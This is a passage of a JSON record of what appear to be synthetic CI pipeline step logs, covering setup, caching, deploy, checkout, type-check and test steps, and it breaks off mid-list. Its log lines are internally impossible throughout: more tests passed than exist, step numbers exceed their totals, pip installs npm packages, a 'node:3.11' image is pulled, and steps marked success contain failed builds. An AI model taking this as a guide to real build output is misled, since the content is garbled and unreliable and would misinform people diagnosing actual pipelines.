          "WARNING: react has known vulnerabilities",
          "npm install: added 368 packages",
          "Checking out develop branch",
          "Minifying main.js",
          "Test Suites: 38 passed, 26 total",
          "Connection established",
          "npm install: resolved 321 packages",
          "Checking out master branch",
          "Loading...",
          "\u2713 validate completed",
          "Coverage: 90% statements, 67% branches",
          "Tests: 350 passed, 197 total",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:19:28.711410",
        "finished_at": "2025-11-25T12:19:43.138875",
        "log_lines": [
          "=== Step: setup_node ===",
          "WARNING: eslint has known vulnerabilities",
          "Snapshots: 38 passed, 16 total",
          "[12:18:45] DEBUG: Connection pool: 6 active",
          "Bundling vendor.css",
          "Success!",
          "pip install: Successfully installed eslint-3.20",
          "pip: Installing build dependencies...",
          "[12:18:45] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 19 modules...",
          "Cache restored successfully (435MB)",
          "Step 20/18: Installing dependencies",
          "Finished.",
          "Verifying...",
          "[12:18:45] DEBUG: Connection pool: 15 active",
          "Cache restored successfully (295MB)",
          "Artifact uploaded: dist.zip (51MB)",
          "Compiling src/handler.rs...",
          "Cache invalidated: dependencies",
          "FAILED: test_cache_hit",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 11/19: Testing",
          "Environment: test",
          "pip: Collecting eslint",
          "Step 11/25: Linting",
          "Processing...",
          "[12:18:45] INFO: Cache refreshed",
          "Step 16/17: Building",
          "npm notice: package.json updated",
          "[12:18:45] DEBUG: Loading configuration",
          "[12:18:45] DEBUG: Loading configuration",
          "WARNING: prettier has known vulnerabilities",
          "Pushing to registry...",
          "POST /upload - 201 (386ms)",
          "[12:18:45] INFO: Starting build process",
          "npm install: resolved 1608 packages",
          "GET /api - 200 (72ms)",
          "Pushing to registry...",
          "yarn add: Done in 30.12s",
          "npm install: resolved 1918 packages",
          "Loading...",
          "Checking out develop branch",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 20MB",
          "Fetching submodules...",
          "\u2713 Step 'setup' succeeded",
          "OK",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] DEBUG: Memory usage: 885MB",
          "TLS handshake completed",
          "[12:18:45] INFO: Starting build process",
          "TLS handshake completed",
          "GET /status - 201 (67ms)",
          "Step 2/16: Building",
          "Compiling src/index.js...",
          "Environment: development",
          "Pushing to registry...",
          "Cache hit for key-4717",
          "POST /upload - 200 (221ms)",
          "Using Node.js 18.18.1",
          "Connecting to cloud.services:443...",
          "Creating production build...",
          "OK",
          "Compiling src/index.js...",
          "Step 18/18: Deploying",
          "NODE_ENV=development",
          "Environment: production",
          "Time: 99.425s",
          "Compiling utils/index.js...",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "[12:18:45] INFO: Request completed",
          "Compiling src/main.py...",
          "Connecting to cloud.services:443...",
          "Step 19/25: Deploying",
          "pip: Downloading eslint-2.1.tar.gz",
          "[12:18:45] DEBUG: Memory usage: 1380MB",
          "Cache saved successfully",
          "\u2713 Task completed in 920ms",
          "Step 11/23: Running migrations",
          "Compiling utils/service.java...",
          "Success!",
          "Step 5/21: Building",
          "Compiling lib/main.py...",
          "Ran 62 tests in 22s",
          "npm install: resolved 1565 packages",
          "[12:18:45] WARN: Deprecated API usage",
          "Using Node.js 19.8.2",
          "GET /health - 204 (6ms)",
          "Creating production build...",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "Cache miss for key-7125",
          "Platform: win32-x64",
          "pip: Installing build dependencies...",
          "Step 20/23: Installing dependencies",
          "TLS handshake completed",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "\u2713 Step 'build' succeeded",
          "yarn add: Done in 20.49s",
          "Compiling components/utils.go...",
          "Coverage: 94% statements, 99% branches",
          "HEAD is now at 678549f",
          "yarn add: Done in 4.48s",
          "WARNING: jest has known vulnerabilities",
          "Fetching submodules...",
          "[12:18:45] DEBUG: Query executed in 93ms",
          "Completed.",
          "pip: Downloading react-4.4.tar.gz",
          "Cache miss for key-6617",
          "Fetching submodules...",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (99MB)",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] INFO: Connecting to database",
          "Optimizing 62 modules...",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "\u2713 package completed",
          "\u2717 build failed with exit code 38",
          "Platform: win32-x64",
          "Cache restored successfully (97MB)",
          "Artifact downloaded: 43MB",
          "Step 5/18: Linting",
          "npm notice: created a lockfile",
          "Transforming 617 files...",
          "Finished.",
          "Using Node.js 16.16.7",
          "Building Docker image...",
          "pip install: Successfully installed react-1.3",
          "  PASS: test_cache_hit (248ms)",
          "Transforming 315 files...",
          "[12:18:45] DEBUG: Memory usage: 537MB",
          "Building Docker image...",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Step 3/18: Testing",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:19:43.138875",
        "finished_at": "2025-11-25T12:19:51.795354",
        "log_lines": [
          "=== Step: save_cache ===",
          "yarn add: Done in 16.18s",
          "Connection established",
          "Success!",
          "Optimizing 55 modules...",
          "[12:18:45] ERROR: Connection failed",
          "[12:18:45] ERROR: Connection failed",
          "Minifying vendor.js",
          "yarn add: Done in 20.66s",
          "Connection established",
          "Step 11/20: Running migrations",
          "OK",
          "  PASS: unit/test_db_connect.spec.js",
          "Pushing to registry...",
          "Platform: linux-x64",
          "pip install: Successfully installed eslint-3.2",
          "npm notice: package.json updated",
          "Compiling utils/handler.rs...",
          "Waiting...",
          "Artifact uploaded: dist.zip (52MB)",
          "Artifact downloaded: 8MB",
          "Switched to branch 'bugfix/task-270'",
          "npm install: added 439 packages",
          "Creating production build...",
          "Cache saved successfully",
          "Compiling lib/app.ts...",
          "[12:18:45] DEBUG: Query executed in 95ms",
          "\u2717 build failed with exit code 7",
          "WARNING: jest has known vulnerabilities",
          "  PASS: unit/test_db_connect.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Verifying...",
          "npm notice: package.json updated",
          "Cache restored successfully (178MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-7706",
          "Ready.",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 Task completed in 294ms",
          "[12:18:45] DEBUG: Connection pool: 1 active",
          "Compiling components/utils.go...",
          "\u2713 lint completed",
          "Done.",
          "\u2713 Task completed in 4786ms",
          "Using Python 3.12",
          "[12:18:45] INFO: Starting build process",
          "Generating source maps...",
          "Bundling main.js",
          "  PASS: unit/test_cache_hit.spec.js",
          "Loading...",
          "npm notice: package.json updated",
          "Ready.",
          "FAILED: test_auth_login",
          "npm install: resolved 465 packages",
          "Verifying...",
          "[12:18:45] DEBUG: Connection pool: 12 active",
          "Cache miss for key-2794",
          "Completed.",
          "Compiling utils/index.js...",
          "Artifact uploaded: dist.zip (34MB)",
          "Completed.",
          "\u2713 build completed",
          "Switched to branch 'hotfix/task-968'",
          "Using Node.js 14.11.3",
          "Cache hit for key-4962",
          "Using Node.js 19.1.4",
          "Step 19/24: Installing dependencies",
          "npm notice: created a lockfile",
          "pip install: Successfully installed webpack-2.4",
          "POST /upload - 201 (255ms)",
          "Done.",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Time: 35.814s",
          "Cache miss for key-6134",
          "pip: Downloading prettier-3.0.tar.gz",
          "Compiling components/handler.rs...",
          "[12:18:45] DEBUG: Connection pool: 8 active",
          "[12:18:45] INFO: Connecting to database",
          "HEAD is now at adf464d",
          "Compiling lib/service.java...",
          "Verifying...",
          "Coverage: 71% statements, 82% branches",
          "Cache miss for key-8463",
          "Test Suites: 16 passed, 15 total",
          "FAILED: test_db_connect",
          "Already up to date.",
          "Verifying...",
          "\u2713 Task completed in 1594ms",
          "[12:18:45] INFO: Starting build process",
          "Fetching submodules...",
          "  PASS: unit/test_user_create.spec.js",
          "\u2713 build completed",
          "Done.",
          "[12:18:45] DEBUG: Connection pool: 11 active",
          "npm install: added 390 packages",
          "Step 16/25: Installing dependencies",
          "[12:18:45] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "\u2713 Task completed in 2967ms",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] INFO: Starting build process",
          "[12:18:45] DEBUG: Connection pool: 8 active",
          "Connection established",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 7/24: Linting",
          "Bundling styles.js",
          "Uploading artifact 'coverage' (17 files)",
          "[12:18:45] INFO: Cache refreshed",
          "Platform: win32-x64",
          "Finished.",
          "Using Node.js 20.9.4",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 133 packages",
          "Optimizing 37 modules...",
          "npm notice: package.json updated",
          "[12:18:45] INFO: Starting build process",
          "Cache miss for key-3165",
          "pip install: Successfully installed jest-2.12",
          "[12:18:45] INFO: Starting build process",
          "Layer 6/14: RUN command",
          "Done.",
          "Ran 12 tests in 3s",
          "Checking out develop branch",
          "Building Docker image...",
          "Exception: TypeError",
          "\u2713 Step 'build' succeeded",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:18:45] INFO: Processing request",
          "Pushing to registry...",
          "[12:18:45] WARN: Deprecated API usage",
          "Waiting...",
          "Verifying...",
          "Artifact downloaded: 15MB",
          "Installing express@5.5.5",
          "\u2713 Task completed in 847ms",
          "Verifying...",
          "Creating production build...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:19:51.795354",
        "finished_at": "2025-11-25T12:19:57.566340",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Uploading artifact 'dist' (33 files)",
          "[12:18:45] DEBUG: Query executed in 86ms",
          "Platform: darwin-arm64",
          "Transforming 697 files...",
          "Step 3/24: Deploying",
          "\u2713 package completed",
          "Processing...",
          "Installing eslint@2.3.4",
          "Success!",
          "Finished.",
          "Environment: test",
          "HEAD is now at 265c1c0",
          "[12:18:45] WARN: Deprecated API usage",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 4/15: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: RuntimeError",
          "Fetching submodules...",
          "[12:18:45] DEBUG: Query executed in 3ms",
          "Finished.",
          "Tests: 72 passed, 220 total",
          "\u2713 test completed",
          "Compiling components/app.ts...",
          "[12:18:45] ERROR: Connection failed",
          "Using Node.js 17.6.4",
          "Using Python 3.12",
          "Waiting...",
          "Cache restored successfully (171MB)",
          "Using Node.js 18.10.5",
          "npm install: added 498 packages",
          "Switched to branch 'bugfix/task-765'",
          "[12:18:45] INFO: Starting build process",
          "WARNING: express has known vulnerabilities",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 16.6.3",
          "Transforming 161 files...",
          "Ran 138 tests in 11s",
          "Bundling main.js",
          "[12:18:45] DEBUG: Query executed in 16ms",
          "Installing jest@4.6.5",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 Task completed in 896ms",
          "TLS handshake completed",
          "pip: Collecting prettier",
          "Compiling lib/app.ts...",
          "[12:18:45] INFO: Processing request",
          "Artifact downloaded: 31MB",
          "Completed.",
          "Platform: darwin-arm64",
          "Finished.",
          "NODE_ENV=development",
          "HEAD is now at c131102",
          "Using Python 3.11",
          "Layer 9/10: RUN command",
          "HEAD is now at 6d751e2",
          "Loading...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_cache_hit (423ms)",
          "Creating production build...",
          "GET /status - 201 (54ms)",
          "Compiling components/app.ts...",
          "Verifying...",
          "pip: Downloading webpack-1.15.tar.gz",
          "\u2713 Step 'test' succeeded",
          "Step 18/15: Running migrations",
          "Already up to date.",
          "Connecting to cloud.services:443...",
          "Step 7/15: Linting",
          "Platform: win32-x64",
          "Cache restored successfully (343MB)",
          "Generating source maps...",
          "Step 7/15: Deploying",
          "Connecting to test.io:443...",
          "Step 2/21: Running migrations",
          "Generating source maps...",
          "Exception: ValueError",
          "Image pulled successfully",
          "POST /data - 200 (478ms)",
          "HEAD is now at 05cac47",
          "Verifying...",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Verifying...",
          "[12:18:45] DEBUG: Query executed in 8ms",
          "Already up to date.",
          "Generating source maps...",
          "Checking out master branch",
          "Fetching submodules...",
          "Step 4/23: Installing dependencies",
          "Waiting...",
          "Step 1/24: Linting",
          "\u2713 All checks passed",
          "pip: Collecting axios",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 5/22: Testing",
          "Step 8/17: Linting",
          "Compiling lib/service.java...",
          "Finished.",
          "Generating source maps...",
          "Waiting...",
          "Using Python 3.11",
          "Fetching submodules...",
          "OK",
          "pip: Downloading prettier-5.6.tar.gz",
          "Pushing to registry...",
          "OK",
          "Time: 19.508s",
          "Generating source maps...",
          "Layer 2/14: ENV command",
          "[12:18:45] INFO: Starting build process",
          "Pushing to registry...",
          "Using Node.js 16.9.7",
          "Pulling image: node:3.11",
          "[12:18:45] DEBUG: Connection pool: 1 active",
          "[12:18:45] DEBUG: Connection pool: 3 active",
          "Creating production build...",
          "Compiling lib/main.py...",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "POST /data - 201 (90ms)",
          "Exception: ValueError",
          "Switched to branch 'bugfix/task-790'",
          "Waiting...",
          "Step 15/15: Deploying",
          "Done.",
          "[12:18:45] INFO: Connecting to database",
          "OK",
          "  PASS: integration/test_user_create.spec.js",
          "  PASS: unit/test_user_create.spec.js",
          "  PASS: e2e/test_auth_login.spec.js",
          "Finished.",
          "Platform: win32-x64",
          "Environment: staging",
          "Building Docker image...",
          "HEAD is now at 1458b94",
          "Transforming 420 files...",
          "\u2713 Task completed in 1604ms",
          "TLS handshake completed",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (22MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:19:57.566340",
        "finished_at": "2025-11-25T12:20:03.337326",
        "log_lines": [
          "=== Step: checkout ===",
          "Pushing to registry...",
          "WARNING: express has known vulnerabilities",
          "Loading...",
          "Cache hit for key-9700",
          "\u2713 Step 'checkout' succeeded",
          "Layer 10/11: ENV command",
          "WARNING: prettier has known vulnerabilities",
          "Connecting to example.com:443...",
          "  PASS: integration/test_user_create.spec.js",
          "  PASS: unit/test_cache_hit.spec.js",
          "Cache saved successfully",
          "Artifact downloaded: 8MB",
          "[12:18:45] WARN: Deprecated API usage",
          "NODE_ENV=test",
          "Compiling components/index.js...",
          "Step 14/21: Building",
          "  PASS: e2e/test_api_health.spec.js",
          "Using Python 3.9",
          "Waiting...",
          "HEAD is now at d84c323",
          "Cache restored successfully (494MB)",
          "Time: 8.86s",
          "Processing...",
          "[12:18:45] WARN: Deprecated API usage",
          "Ready.",
          "Compiling src/utils.go...",
          "Cache invalidated: build",
          "  PASS: test_db_connect (230ms)",
          "[12:18:45] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (84MB)",
          "GET /health - 204 (95ms)",
          "Snapshots: 22 passed, 30 total",
          "Pushing to registry...",
          "[12:18:45] INFO: Connecting to database",
          "Step 6/16: Building",
          "Success!",
          "Step 4/22: Running migrations",
          "pip install: Successfully installed prettier-2.1",
          "Creating production build...",
          "[12:18:45] WARN: Deprecated API usage",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache saved successfully",
          "Step 11/18: Linting",
          "Image pulled successfully",
          "[12:18:45] WARN: Deprecated API usage",
          "[12:18:45] WARN: Deprecated API usage",
          "Creating production build...",
          "Connection established",
          "[12:18:45] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 137 tests in 49s",
          "Image pulled successfully",
          "Loading...",
          "[12:18:45] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-1941",
          "Cache restored successfully (484MB)",
          "Step 5/23: Building",
          "Fetching submodules...",
          "Connecting to cloud.services:443...",
          "Compiling lib/utils.go...",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "[12:18:45] INFO: Connecting to database",
          "Pushing to registry...",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Time: 88.808s",
          "Step 3/15: Linting",
          "Exception: NullPointerException",
          "Image pulled successfully",
          "[12:18:45] INFO: Starting build process",
          "Building Docker image...",
          "POST /api - 202 (98ms)",
          "Building Docker image...",
          "Snapshots: 5 passed, 36 total",
          "npm install: resolved 1154 packages",
          "Using Python 3.10",
          "[12:18:45] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Verifying...",
          "Cache restored successfully (227MB)",
          "OK",
          "Compiling src/service.java...",
          "Already up to date.",
          "yarn add: Done in 10.6s",
          "Connection established",
          "  PASS: test_cache_hit (147ms)",
          "Time: 104.184s",
          "Step 15/15: Installing dependencies",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "[12:18:45] INFO: Cache refreshed",
          "Optimizing 80 modules...",
          "Done.",
          "Checking out develop branch",
          "[12:18:45] INFO: Starting build process",
          "Checking out main branch",
          "Coverage: 88% statements, 61% branches",
          "[12:18:45] DEBUG: Loading configuration",
          "Verifying...",
          "Connecting to cloud.services:443...",
          "npm install: added 334 packages",
          "\u2713 validate completed",
          "Installing react@2.2.6",
          "[12:18:45] DEBUG: Connection pool: 5 active",
          "[12:18:45] INFO: Cache refreshed",
          "\u2713 Task completed in 1572ms",
          "pip: Downloading jest-1.2.tar.gz",
          "Compiling components/handler.rs...",
          "[12:18:45] DEBUG: Memory usage: 1413MB",
          "Connection established",
          "\u2713 Task completed in 2995ms",
          "[12:18:45] INFO: Processing request",
          "\u2713 All checks passed",
          "Processing...",
          "[12:18:45] WARN: Deprecated API usage",
          "Done.",
          "[12:18:45] DEBUG: Memory usage: 745MB",
          "\u2717 build failed with exit code 63",
          "Checking out master branch",
          "Platform: linux-x64",
          "Already up to date.",
          "Platform: linux-x64",
          "Tests: 80 passed, 329 total",
          "  PASS: unit/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying vendor.js",
          "[12:18:45] INFO: Cache refreshed",
          "Connecting to acme.corp:443...",
          "Pushing to registry...",
          "Exception: ValueError",
          "Environment: staging",
          "[12:18:45] INFO: Cache refreshed",
          "[12:18:45] ERROR: Connection failed",
          "Using Python 3.12",
          "Using Python 3.11",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:20:03.337326",
        "finished_at": "2025-11-25T12:20:17.764791",
        "log_lines": [
          "=== Step: type_check ===",
          "pip: Downloading webpack-5.5.tar.gz",
          "Artifact uploaded: dist.zip (58MB)",
          "WARNING: eslint has known vulnerabilities",
          "Checking out develop branch",
          "OK",
          "Cache invalidated: dependencies",
          "Installing express@4.8.3",
          "[12:18:45] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "OK",
          "\u2713 Step 'build' succeeded",
          "Installing jest@1.13.0",
          "Installing axios@5.17.6",
          "pip: Collecting prettier",
          "Creating production build...",
          "WARNING: jest has known vulnerabilities",
          "[12:18:45] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "Bundling runtime.css",
          "Already up to date.",
          "  PASS: test_api_health (318ms)",
          "Cache miss for key-3630",
          "Bundling runtime.js",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Success!",
          "[12:18:45] DEBUG: Query executed in 12ms",
          "Creating production build...",
          "Loading...",
          "POST /api - 200 (395ms)",
          "Ready.",
          "Artifact uploaded: build.tar.gz (47MB)",
          "GET /api - 204 (37ms)",
          "Using Python 3.10",
          "Layer 7/8: RUN command",
          "\u2717 build failed with exit code 39",
          "GET /api - 200 (93ms)",
          "NODE_ENV=development",
          "OK",
          "Finished.",
          "Cache hit for key-7676",
          "[12:18:45] WARN: Deprecated API usage",
          "Building Docker image...",
          "Step 5/24: Testing",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Success!",
          "Cache invalidated: dependencies",
          "\u2713 Task completed in 3692ms",
          "\u2713 All checks passed",
          "Cache invalidated: build",
          "Step 16/22: Installing dependencies",
          "Platform: win32-x64",
          "Step 18/15: Linting",
          "  PASS: test_cache_hit (279ms)",
          "[12:18:45] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (23MB)",
          "npm notice: created a lockfile",
          "Already up to date.",
          "OK",
          "Using Node.js 20.14.4",
          "Generating source maps...",
          "Step 14/22: Building",
          "yarn add: Done in 19.20s",
          "Compiling lib/app.ts...",
          "Verifying...",
          "npm install: added 321 packages",
          "Compiling src/service.java...",
          "Cache invalidated: build",
          "Pushing to registry...",
          "Switched to branch 'hotfix/task-193'",
          "GET /health - 204 (63ms)",
          "Compiling utils/main.py...",
          "Waiting...",
          "pip: Downloading lodash-1.11.tar.gz",
          "npm notice: package.json updated",
          "Installing jest@5.6.9",
          "[12:18:45] INFO: Cache refreshed",
          "Compiling utils/handler.rs...",
          "Layer 10/12: COPY command",
          "  PASS: test_cache_hit (6ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "npm install: added 492 packages",
          "pip install: Successfully installed express-3.3",
          "Step 17/16: Linting",
          "Loading...",
          "Minifying app.js",
          "npm install: added 404 packages",
          "Cache miss for key-8254",
          "HEAD is now at a2ea178",
          "Finished.",
          "Checking out main branch",
          "Image pulled successfully",
          "Step 8/22: Building",
          "Test Suites: 14 passed, 13 total",
          "Image pulled successfully",
          "Transforming 919 files...",
          "\u2713 Task completed in 3312ms",
          "Using Node.js 16.17.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (449ms)",
          "GET /api - 201 (1ms)",
          "Finished.",
          "TLS handshake completed",
          "[12:18:45] DEBUG: Memory usage: 1083MB",
          "Connection established",
          "Done.",
          "\u2717 build failed with exit code 35",
          "Using Node.js 17.2.1",
          "[12:18:45] DEBUG: Connection pool: 17 active",
          "Minifying main.js",
          "[12:18:45] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 39 passed, 8 total",
          "Using Python 3.11",
          "pip: Downloading express-1.15.tar.gz",
          "Time: 25.262s",
          "Ran 49 tests in 11s",
          "HEAD is now at 595182d",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Connection established",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "Loading...",
          "Step 6/24: Installing dependencies",
          "npm notice: created a lockfile",
          "Coverage: 99% statements, 62% branches",
          "Minifying app.js",
          "[12:18:45] DEBUG: Memory usage: 264MB",
          "Minifying app.js",
          "Creating production build...",
          "Using Python 3.12",
          "HEAD is now at dd72ff0",
          "Step 19/23: Testing",
          "Using Node.js 17.16.3",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "Compiling utils/index.js...",
          "Connection established",
          "Connecting to example.com:443...",
          "Artifact uploaded: dist.zip (37MB)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-25T12:20:17.764791",
        "finished_at": "2025-11-25T12:20:32.192256",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "TLS handshake completed",
          "\u2717 build failed with exit code 109",
          "Switched to branch 'feature/task-600'",
          "[12:18:45] DEBUG: Memory usage: 1403MB",
          "Tests: 440 passed, 401 total",
          "Cache miss for key-3416",
          "Pushing to registry...",
          "Cache invalidated: dependencies",
          "Processing...",
          "Finished.",
          "Transforming 335 files...",
          "Step 20/23: Testing",
          "npm install: resolved 893 packages",
          "Verifying...",
          "TLS handshake completed",
          "Artifact downloaded: 29MB",
          "\u2713 All checks passed",
          "Switched to branch 'hotfix/task-448'",
          "Cache restored successfully (297MB)",
          "Cache miss for key-8531",
          "Done.",
          "Step 13/17: Running migrations",
          "npm notice: package.json updated",
          "[12:18:45] INFO: Cache refreshed",
          "Ran 22 tests in 47s",
          "[12:18:45] INFO: Cache refreshed",
          "WARNING: express has known vulnerabilities",
          "pip: Installing build dependencies...",
          "OK",
          "[12:18:45] DEBUG: Initializing service",
          "[12:18:45] WARN: Deprecated API usage",
          "yarn add: Done in 25.14s",
          "Loading...",
          "POST /api - 201 (373ms)",
          "Artifact downloaded: 27MB",
          "[12:18:45] DEBUG: Loading configuration",
          "Bundling styles.css",
          "[12:18:45] DEBUG: Memory usage: 490MB",
          "Cache hit for key-3722",
          "Transforming 533 files...",
          "[12:18:45] DEBUG: Memory usage: 614MB",
          "TLS handshake completed",
          "Step 16/21: Installing dependencies",
          "Checking out main branch",
          "[12:18:45] DEBUG: Memory usage: 826MB",
          "[12:18:45] WARN: Deprecated API usage",
          "Tests: 490 passed, 320 total",
          "Step 13/18: Linting",
          "[12:18:45] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Waiting...",
          "Cache saved successfully",
          "Environment: staging",
          "[12:18:45] INFO: Cache refreshed",
          "[12:18:45] INFO: Processing request",
          "Step 17/22: Running migrations",
          "Image pulled successfully",
          "GET /status - 204 (49ms)",
          "Checking out main branch",
          "Connecting to acme.corp:443...",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Bundling runtime.js",
          "Cache hit for key-8590",
          "pip: Downloading lodash-2.1.tar.gz",
          "Coverage: 87% statements, 61% branches",
          "Compiling utils/handler.rs...",
          "[12:18:45] DEBUG: Initializing service",
          "Ready.",
          "NODE_ENV=production",
          "Artifact uploaded: dist.zip (86MB)",
          "NODE_ENV=development",
          "Switched to branch 'feature/task-134'",
          "[12:18:45] ERROR: Connection failed",
          "[12:18:45] ERROR: Connection failed",
          "Compiling utils/app.ts...",
          "[12:18:45] DEBUG: Loading configuration",
          "Pulling image: node:3.11",
          "Artifact uploaded: dist.zip (4MB)",
          "Connecting to acme.corp:443...",
          "\u2713 All checks passed",
          "Cache invalidated: node_modules",
          "Connecting to startup.dev:443...",
          "Time: 51.943s",
          "[12:18:45] INFO: Starting build process",
          "Step 1/23: Building",
          "[12:18:45] INFO: Request completed",
          "Transforming 490 files...",
          "[12:18:45] DEBUG: Loading configuration",
          "[12:18:45] INFO: Processing request",
          "Checking out master branch",
          "pip: Downloading lodash-3.19.tar.gz",
          "Optimizing 27 modules...",
          "Compiling lib/main.py...",
          "Fetching submodules...",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache saved successfully",
          "GET /status - 201 (21ms)",
          "npm notice: created a lockfile",
          "Environment: test",
          "Building Docker image...",
          "HEAD is now at 17685c5",
          "POST /data - 202 (310ms)",
          "[12:18:45] DEBUG: Memory usage: 818MB",
          "Completed.",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "\u2717 build failed with exit code 34",
          "npm notice: package.json updated",
          "WARNING: express has known vulnerabilities",
          "Connecting to acme.corp:443...",
          "Snapshots: 27 passed, 14 total",
          "Step 20/23: Running migrations",
          "Pushing to registry...",
          "Completed.",
          "Waiting...",
          "Artifact downloaded: 49MB",
          "Environment: production",
          "[12:18:45] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Loading...",
          "Switched to branch 'feature/task-130'",
          "POST /api - 201 (232ms)",
          "Bundling main.js",
          "pip: Installing build dependencies...",
          "Compiling utils/utils.go...",
          "Test Suites: 5 passed, 35 total",
          "Pulling image: alpine:3.11",
          "POST /api - 202 (328ms)",
          "[12:18:45] DEBUG: Loading configuration",
          "GET /api - 201 (28ms)",
          "Compiling lib/app.ts...",
          "Compiling src/main.py...",
          "\u2713 Step 'test' succeeded",
          "Generating source maps...",
          "Using Node.js 18.10.7",
          "[12:18:45] DEBUG: Memory usage: 1272MB",
          "pip: Downloading eslint-1.9.tar.gz",
          "Image pulled successfully",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-25T12:20:32.192256",
        "finished_at": "2025-11-25T12:21:15.474650",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Exception: ValueError",
          "[12:18:45] INFO: Starting build process",
          "\u2713 Step 'test' succeeded",
          "POST /api - 201 (12ms)",
          "npm install: resolved 1521 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 2108ms",
          "NODE_ENV=development",
          "Compiling components/utils.go...",
          "Pushing to registry...",
          "[12:18:45] DEBUG: Initializing service",
          "pip: Collecting prettier",
          "Transforming 357 files...",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "Pushing to registry...",
          "Verifying...",
          "[12:18:45] DEBUG: Loading configuration",
          "Connecting to startup.dev:443...",
          "Artifact downloaded: 40MB",
          "Step 16/17: Deploying",
          "Cache miss for key-9050",
          "[12:18:45] DEBUG: Connection pool: 20 active",
          "pip: Installing build dependencies...",
          "[12:18:45] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Already up to date.",
